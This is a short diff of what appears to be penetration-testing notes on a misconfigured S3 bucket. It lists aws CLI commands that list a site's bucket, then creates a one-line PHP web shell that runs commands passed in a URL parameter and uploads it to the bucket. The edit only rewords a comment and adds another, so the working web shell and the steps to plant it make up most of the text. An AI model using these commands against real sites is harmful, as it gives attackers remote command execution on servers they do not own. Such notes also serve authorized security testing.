@@ -16,8 +16,9 @@ Commands
     aws --endpoint=http://s3.site.com s3 ls      
     aws --endpoint=http://s3.site.com s3 ls s3://site.com   #list objects and common prefixes   
   
-   # might be able to upload a php web shell
-    echo '<?php system($_GET["cmd"]); ?>' > shell.php
+might be able to upload a php web shell      
+
+    echo '<?php system($_GET["cmd"]); ?>' > shell.php   #make web shell file   
     aws --endpoint=http://s3.site.com s3 cp shell.php s3://site.com    
 
     
